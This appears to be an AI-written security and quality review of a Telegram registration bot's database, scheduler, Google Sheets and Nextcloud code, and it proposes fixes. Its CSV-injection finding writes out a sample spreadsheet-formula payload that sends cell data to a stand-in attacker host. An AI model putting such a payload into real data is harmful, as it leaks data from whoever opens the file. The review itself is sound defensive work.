---
phase: D-data-services
reviewed: 2026-07-13T00:00:00Z
depth: deep
files_reviewed: 10
files_reviewed_list:
  - database/db.py
  - services/scheduler.py
  - services/sheets.py
  - services/reminders.py
  - services/allowlist.py
  - services/nextcloud.py
  - main.py
  - config.py
  - scripts/backfill_resumes.py
  - scripts/diag_sheet_columns.py
findings:
  critical: 1
  warning: 8
  info: 8
  total: 17
status: issues_found
---

# Zone D: Data Layer, Services, Entrypoint, Scripts — Code Review Report

**Reviewed:** 2026-07-13
**Depth:** deep
**Files Reviewed:** 10
**Status:** issues_found

## Summary

Reviewed the SQLite data layer (`database/db.py`), the APScheduler-based job service, Google
Sheets sync, Nextcloud WebDAV upload, allowlist/reminders services, `main.py` startup wiring,
`config.py`, and the two one-off scripts. Overall the brownfield migration pattern
(`CREATE TABLE IF NOT EXISTS` + `_ensure_column`) is additive and non-destructive as required,
and the parameterized-query discipline in `db.py` is good — no exploitable SQL injection was
found (the one raw-`WHERE`-composition path, `_build_filter_clause`, uses a hard column
whitelist correctly).

The standout finding is a genuine, exploitable **CSV/formula-injection vulnerability**
(CWE-1236) in the CSV export path: fully user-controlled registration fields (full name,
comments, expectations, etc.) flow unsanitized into `export_users_csv()` and are handed to
admins as an Excel-opened `.csv` file — a crafted `full_name` starting with `=`, `+`, `-`, or
`@` will execute as a formula in Excel/LibreOffice.

Beyond that, I found a real cross-file logic bug (the interval-driven "Незавершённые" sheet
sync uses a header list that doesn't match its own row shape and skips the human-readable
label mapping that the admin-triggered equivalent uses), several reliability gaps around
fire-and-forget asyncio tasks / scheduler misfire handling / graceful shutdown, a PII-in-logs
issue, and a handful of lower-severity code-quality items.

## Critical Issues

### CR-01: CSV/formula injection in `export_users_csv()` — unsanitized user input opened by admins in Excel

**File:** `database/db.py:442-450` (consumed by `handlers/admin.py:1063-1070`, `:1183-1194`)
**Issue:**
`export_users_csv()` does a raw `SELECT * FROM users` and returns every column verbatim,
including fully user-controlled free-text fields entered during Telegram registration
(`full_name`, `comments`, `expectations`, `expectations_ar`, `missing_skills`,
`source_details`, `city`, `university`, etc. — see `add_user()` at `database/db.py:187-327`,
all populated straight from delegate-supplied FSM answers). `handlers/admin.py` writes these
values into a CSV via `csv.writer(..., quoting=csv.QUOTE_MINIMAL)` and sends the file to an
admin as "База данных пользователей" (`answer_document`, meant to be opened in Excel/Sheets).

`QUOTE_MINIMAL` only quotes cells containing the delimiter/quote/newline — it does **not**
neutralize a leading `=`, `+`, `-`, or `@`. A delegate who registers with, e.g.,
`full_name = "=HYPERLINK(\"http://evil.example/?d=\"&A1,\"click\")"` produces a CSV cell that
Excel/LibreOffice will evaluate as a live formula the moment an admin opens the export —
classic CSV/formula injection (CWE-1236), capable of exfiltrating other cells' contents via
`HYPERLINK`/`WEBSERVICE`, or (on older Excel with DDE enabled) command execution.

This is squarely in Zone D because the vulnerable *data source* is `db.py`'s
`export_users_csv()` — every consumer that turns its rows into a spreadsheet inherits the
same defect (this also affects the Google Sheets append path in `services/sheets.py`, though
that risk is materially lower because gspread's `append_row`/`update` default to
`value_input_option='RAW'`, storing the string literally rather than evaluating it — worth
re-confirming against the installed gspread version, see IN-06).

**Fix:** Sanitize at the source, in `export_users_csv()` (or immediately before writing the
CSV), by prefixing any cell value that starts with `=`, `+`, `-`, `@`, tab, or CR with a
single quote/apostrophe (the standard OWASP CSV-injection mitigation), e.g.:

```python
_FORMULA_TRIGGERS = ("=", "+", "-", "@", "\t", "\r")

def _csv_sanitize(value):
    if isinstance(value, str) and value.startswith(_FORMULA_TRIGGERS):
        return "'" + value
    return value

async def export_users_csv():
    async with aiosqlite.connect(config.DB_PATH) as db:
        async with db.execute('SELECT * FROM users') as cursor:
            raw = [description[0] for description in cursor.description]
            rows = await cursor.fetchall()
            headers = [CSV_HEADER_LABELS.get(h, h) for h in raw]
            safe_rows = [tuple(_csv_sanitize(v) for v in row) for row in rows]
            return headers, safe_rows
```

## Warnings

### WR-01: Scheduled "Незавершённые" sheet sync writes a header/row mismatch and skips label mapping

**File:** `services/scheduler.py:297-307`
**Issue:** `sync_incomplete_sheet_job()` (the interval job that auto-refreshes the
"Незавершённые" tab every `incomplete_sync_hours`, default 2h) does:

```python
rows = await get_incomplete_rows()
headers = ["ID Telegram", "Username", "Начал регистрацию"]
await sync_named_worksheet("Незавершённые", headers, rows)
```

`get_incomplete_rows()` (`database/db.py:548-557`) returns 4-tuples
`(telegram_id, username, started_at, last_step)`, but `headers` only has 3 entries, and
`last_step` is passed through as the **raw internal step_key** (e.g. `"university"`,
`"consent:privacy"`) instead of being mapped through `dropout_step_label()`. Compare with the
admin-triggered equivalent, `handlers/admin.py:1074-1086`, which correctly uses 4 headers
(including `"Остановился на"`) and maps every row through `dropout_step_label(last_step)`.

Since `sync_named_worksheet` does a full `ws.clear()` + rewrite (`services/sheets.py:148-159`),
every scheduled run silently overwrites whatever correct/labeled export an admin previously
triggered manually, replacing it with a narrower header row and raw technical step keys in an
unlabeled 4th column. This is a genuine, reproducible data-quality bug, not a hypothetical.

**Fix:** Reuse the same header list and label mapping in both places — e.g. factor
`handlers/admin.py`'s row-building logic into a shared helper both call, or simply fix
`sync_incomplete_sheet_job`:

```python
from handlers.registration import dropout_step_label  # or move the helper to db.py/sheets.py

async def sync_incomplete_sheet_job():
    rows = await get_incomplete_rows()
    headers = ["ID Telegram", "Username", "Начал регистрацию", "Остановился на"]
    sheet_rows = [(tid, uname, started, dropout_step_label(step)) for tid, uname, started, step in rows]
    await sync_named_worksheet("Незавершённые", headers, sheet_rows)
```

### WR-02: Fire-and-forget `asyncio.create_task` calls in `main.py` hold no reference — tasks can be silently garbage-collected

**File:** `main.py:59`, `main.py:79`, `main.py:84`
**Issue:**
```python
asyncio.create_task(ensure_sheet_header(await active_sheet_headers()))
...
asyncio.create_task(pending_reminder_loop(bot))
...
asyncio.create_task(refresh_allowlist())
```
None of these task objects are stored anywhere. Per the asyncio documentation: *"Important:
Save a reference to the result of this function, to avoid a task disappearing mid-execution.
The event loop only keeps weak references to tasks. A task that isn't referenced elsewhere may
get garbage collected at any time, even before it's done."* `pending_reminder_loop` in
particular is meant to run forever as the sole mechanism that pings admins about a pending-
applications backlog (`services/reminders.py:31-49`); if it's ever collected, admins silently
stop getting notified with no error logged anywhere.

**Fix:** Keep strong references, e.g. a module-level set:
```python
_background_tasks: set[asyncio.Task] = set()

def _spawn(coro):
    t = asyncio.create_task(coro)
    _background_tasks.add(t)
    t.add_done_callback(_background_tasks.discard)
    return t

_spawn(ensure_sheet_header(await active_sheet_headers()))
_spawn(pending_reminder_loop(bot))
_spawn(refresh_allowlist())
```

### WR-03: No graceful shutdown of the scheduler or bot session

**File:** `main.py:87-96`
**Issue:** On `KeyboardInterrupt`/`SystemExit`, `main.py` only logs `"Bot stopped!"`. Neither
`get_scheduler().shutdown()` nor `bot.session.close()` is called. The `AsyncIOScheduler`'s
`SQLAlchemyJobStore` keeps an open SQLAlchemy engine/connection to `data/jobs.sqlite`, and the
`Bot`'s aiohttp session holds open connector sockets. Relying on interpreter teardown to clean
these up is fragile (e.g. under a process manager doing graceful SIGTERM restarts, or in tests
that import `main`).
**Fix:**
```python
except (KeyboardInterrupt, SystemExit):
    logging.info("Bot stopped!")
finally:
    try:
        get_scheduler().shutdown(wait=False)
    except Exception:
        pass
```
(and close `bot.session` / call `await dp.stop_polling()` in an outer `finally` inside `main()`).

### WR-04: `misfire_grace_time=3600` silently drops scheduled broadcasts / payment reminders missed by more than an hour, with no detection

**File:** `services/scheduler.py:84-87`
**Issue:** `job_defaults={"misfire_grace_time": 3600, "coalesce": True}` means: if the bot
process is down (deploy, crash, host maintenance) for longer than one hour spanning a
scheduled `date` job's `run_date` (a scheduled broadcast via `schedule_broadcast_job`, or a
payment reminder via `schedule_payment_reminder`), APScheduler 3.x's default misfire handling
**skips the run entirely** — the job function is never invoked, no exception is raised, and
APScheduler only logs its own internal warning (not routed through this project's logging
config in a way that surfaces to admins). The broadcast row stays `status='pending'` forever
in `scheduled_broadcasts` with nothing ever calling `mark_broadcast_sent`, and no admin is
told the scheduled comms never went out.
**Fix:** Either raise `misfire_grace_time` to something safe for realistic downtime windows,
or add a startup reconciliation pass: on boot, query `list_pending_broadcasts()` for rows whose
`scheduled_at` is already in the past and no longer has a live job in the scheduler, and either
re-fire them or alert an admin. At minimum, log/alert when `get_scheduled_broadcast` rows are
found `pending` well past their `scheduled_at`.

### WR-05: `services/sheets.py`'s cached `_sheet` global is not thread-safe

**File:** `services/sheets.py:17-38`
**Issue:** `_sheet` is a plain module global, read via `_get_sheet()` and written by many
different sync functions (`_append_to_sheet_sync`, `_ensure_header_sync`,
`_update_status_in_sheet_sync`, etc.), each invoked through `asyncio.to_thread(...)` — i.e.
each call can run on a *different* worker thread from the default executor's thread pool.
`_get_sheet()`'s check-then-set (`if _sheet is not None: return _sheet; ... _sheet = ...`) is a
classic TOCTOU race: two concurrent sheet operations (e.g. a registration append racing an
admin "Пересобрать таблицу" click) can both see `_sheet is None`, both build a fresh
`gspread.service_account(...)` client and re-open the spreadsheet, and the last write wins.
Impact today is limited to a wasted extra auth/open round-trip rather than corruption, but it's
a real race the review was specifically asked to check for.
**Fix:** Guard the read-check-set with a `threading.Lock()` (not `asyncio.Lock`, since this
runs across worker threads) around the body of `_get_sheet()`.

### WR-06: Full registration payload (including phone/email) logged at INFO/ERROR level

**File:** `services/sheets.py:114`, `services/sheets.py:122`
**Issue:**
```python
logger.info(f"Successfully appended to Google Sheet: {data}")
...
logger.error(f"Failed to append to Google Sheet after {MAX_RETRIES} attempts: {data}")
```
`data` is the full row list passed to `append_to_sheet`, which includes phone number, email,
full name, and other PII collected during registration. `LOG_LEVEL` defaults to `INFO`
(`config.py:26`), and the file handler retains up to 5 × 10MB rotated log files
(`main.py:32-34`) — meaning every successful registration's full PII payload is persisted in
plaintext on disk for an extended period, well beyond what's needed for debugging (the id/name
is already enough context).
**Fix:** Log a bounded summary instead of the raw row, e.g.
`logger.info(f"Successfully appended row for telegram_id={data[0]!r} to Google Sheet")` (assuming
telegram_id is `data[0]`), or truncate/redact before logging.

### WR-07: `NEXTCLOUD_VERIFY_TLS` defaults to `False` — TLS certificate verification disabled by default

**File:** `config.py:43`, `services/nextcloud.py:39`
**Issue:** `NEXTCLOUD_VERIFY_TLS: bool = False` (and `.env.example` ships `NEXTCLOUD_VERIFY_TLS=false`
as the shown default), which flows into `ssl_arg = None if config.NEXTCLOUD_VERIFY_TLS else False`
in `_put_bytes()` — i.e. `aiohttp` is told `ssl=False`, disabling certificate validation
entirely. Every WebDAV PUT also carries `aiohttp.BasicAuth(NEXTCLOUD_USER, NEXTCLOUD_APP_PASS)`
in the same request. With cert verification off by default, both the app-password credential
and the uploaded resume (PII) are exposed to trivial MITM interception/credential theft on any
network path between the bot host and the Nextcloud server, and this is the out-of-the-box
posture unless an operator actively flips the flag. This is a documented, deliberate trade-off
for a self-signed-cert deployment, but shipping "insecure" as the *default* (rather than
requiring an explicit, clearly-labeled opt-out) is a real exposure worth flagging.
**Fix:** Default `NEXTCLOUD_VERIFY_TLS = True`; require operators who genuinely need
self-signed-cert support to opt out explicitly, and consider supporting a custom CA bundle path
instead of a blanket disable.

### WR-08: `_ensure_column`/`_column_exists` build SQL via unparameterized f-string interpolation of identifiers

**File:** `database/db.py:11-19`
**Issue:**
```python
async def _column_exists(db, table_name, column_name):
    async with db.execute(f"PRAGMA table_info({table_name})") as cursor: ...

async def _ensure_column(db, table_name, column_name, definition):
    if not await _column_exists(db, table_name, column_name):
        await db.execute(f"ALTER TABLE {table_name} ADD COLUMN {column_name} {definition}")
```
SQLite's parameter binding doesn't support identifiers (table/column names), so some
interpolation is unavoidable here — but every current call site passes hardcoded string
literals (`"users"`, `"phone"`, etc.), so there is no exploitable path today. Flagging as a
landmine: if either helper is ever called with a value influenced by admin-configurable
settings or user input (e.g. a future "custom question key" feature), this becomes a direct
SQL injection primitive with no guard rail in place.
**Fix:** Add a defensive identifier check (e.g. `assert re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]*", table_name)`)
inside `_ensure_column`/`_column_exists` so any future misuse fails loudly instead of silently
opening an injection path.

## Info

### IN-01: `get_user()` computes `db_path` unconditionally, only used on the not-found path

**File:** `database/db.py:329-338`
**Issue:** `db_path = os.path.abspath(config.DB_PATH)` runs on every call to `get_user`, but
it's only referenced in the `logger.info(...)` branch when the row isn't found.
**Fix:** Move the `os.path.abspath` call inside the `if row is None:` branch.

### IN-02: `NEXTCLOUD_BASE_URL` config field is declared but never read

**File:** `config.py:37`
**Issue:** `NEXTCLOUD_BASE_URL: str = ""` is defined and documented in `.env.example`, but
`services/nextcloud.py` only reads `NEXTCLOUD_WEBDAV_URL`, `NEXTCLOUD_PUBLIC_URL`,
`NEXTCLOUD_FOLDER_SHARE_TOKEN`, `NEXTCLOUD_USER`, `NEXTCLOUD_APP_PASS`, `NEXTCLOUD_FOLDER`, and
`NEXTCLOUD_VERIFY_TLS`. `NEXTCLOUD_BASE_URL` is dead configuration.
**Fix:** Remove it, or wire it in if it was meant to seed `NEXTCLOUD_WEBDAV_URL`/`NEXTCLOUD_PUBLIC_URL`.

### IN-03: `_safe_name()` does not reject a bare `".."` path segment

**File:** `services/nextcloud.py:26-30`
**Issue:** `re.sub(r"[^\w.\-]", "_", base)` preserves literal dots, so `_safe_name("..")` returns
`".."` unchanged, which if ever used directly as `remote_name` in `_put_bytes`'s
`f"{WEBDAV_URL}/{folder}/{remote_name}"` would point one directory above `resumes`. Not
currently reachable — both call sites (`handlers/registration.py:_resume_person_name`,
`scripts/backfill_resumes.py`) always prepend a non-empty `"<full_name>_<username_or_id>"`
prefix before the extension, so the final filename can never literally equal `".."`. Still,
`_safe_name` is a generic sanitizer and shouldn't rely on caller discipline.
**Fix:** After the regex substitution, additionally reject/normalize segments matching
`^\.+$` (e.g. fall back to `"resume"`).

### IN-04: `_put_bytes` interpolates `remote_name` into the URL without explicit `quote()`

**File:** `services/nextcloud.py:45-47`
**Issue:** `put_url = f"{config.NEXTCLOUD_WEBDAV_URL.rstrip('/')}/{folder}/{remote_name}"` relies
on aiohttp/yarl's implicit percent-encoding of the string when constructing the request,
whereas `_file_link()` (`services/nextcloud.py:55-63`) explicitly calls `quote(remote_name)`.
Functionally this works today (yarl encodes non-ASCII/space characters on parse), but the
inconsistency is fragile if the PUT is ever changed to build a `yarl.URL` object directly
(which requires you to pre-encode) or if `remote_name` starts containing characters yarl
doesn't auto-encode as expected.
**Fix:** Use `quote(remote_name)` in `_put_bytes` too, for consistency and defense-in-depth.

### IN-05: `requirements.txt` pins no version for `gspread`

**File:** `requirements.txt:6`
**Issue:** `gspread` (no version specifier) means a fresh `pip install -r requirements.txt` can
silently pick up a new major version with different defaults (e.g. `value_input_option`
semantics referenced in CR-01's mitigation discussion, or `Worksheet.update()` signature
changes across gspread 5.x → 6.x). CLAUDE.md documents "latest" as an intentional choice, but
unpinned production dependencies remain a reproducibility/security-drift risk.
**Fix:** Pin to a known-good major.minor (e.g. `gspread>=6.0,<7.0`) and bump deliberately.

### IN-06: `config.py` uses the pydantic v1-style inner `class Config`

**File:** `config.py:49-52`
**Issue:** `pydantic-settings` (built on pydantic v2) supports the legacy inner `class Config:`
for backward compatibility, but the idiomatic v2 API is
`model_config = SettingsConfigDict(env_file=".env", ...)`. Not a functional bug, but a
deprecated pattern that may trigger warnings on future pydantic-settings upgrades.
**Fix:**
```python
from pydantic_settings import BaseSettings, SettingsConfigDict

class Settings(BaseSettings):
    model_config = SettingsConfigDict(env_file=".env", env_file_encoding="utf-8", extra="ignore")
    ...
```

### IN-07: `approve_all_pending()` docstring describes a fallback that isn't implemented

**File:** `database/db.py:655-667`
**Issue:** The docstring describes an "older sqlite fallback: BEGIN IMMEDIATE; SELECT...;
UPDATE...; COMMIT" for SQLite versions before 3.35 lacking `RETURNING` support, but the
function body only implements the `RETURNING`-based path — there's no version check or
fallback code. Given the project's Python 3.10+ requirement this is very unlikely to bite in
practice, but the comment is misleading about what the code actually does.
**Fix:** Either implement the described fallback guarded by a `sqlite3.sqlite_version_info`
check, or trim the docstring to state the `RETURNING` requirement as a hard dependency.

### IN-08: `_apply_status_formatting_sync` can accumulate duplicate conditional-format rules

**File:** `services/sheets.py:225-266`
**Issue:** The function's own docstring acknowledges: *"Повторный вызов может накопить дубли
conditional-format правил (безвредно визуально)"* — every call to `rebuild_main_sheet`
(`services/sheets.py:304-318`) appends 3 new `addConditionalFormatRule` requests rather than
replacing existing ones, so repeated admin "Пересобрать таблицу" clicks slowly accumulate
duplicate formatting rules on the sheet (self-acknowledged as visually harmless, but it is
unbounded growth of spreadsheet metadata over the life of the project).
**Fix:** Either delete existing rules for the status column before re-adding (via
`deleteConditionalFormatRule` with the tracked index), or check the current rule count once and
skip re-adding if already present.

---

_Reviewed: 2026-07-13_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: deep_
